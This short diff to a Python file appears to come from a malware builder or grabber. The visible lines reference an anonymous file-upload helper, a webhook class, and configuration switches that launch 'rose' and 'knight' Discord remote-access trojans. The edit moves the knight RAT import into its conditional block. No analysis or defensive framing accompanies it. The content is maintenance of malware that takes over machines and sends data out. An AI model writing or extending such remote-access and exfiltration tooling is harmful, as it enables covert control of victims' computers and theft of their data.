@@ -11,7 +11,6 @@ from anonFile import uploadToAnonfiles
 ii = informations.Info()
 _webh = _webhook.WebhookX()
 cc = Config()
-import knight_rat
 import getpass
 import platform
 import ctypes
@@ -858,4 +857,4 @@ if cc.get_rose_discord_rat() is True:
     rose_rat.run_rat()
     
 if cc.get_knight_discord_rat() is True:
-    knight_rat.run_rat()
+    import knight_rat
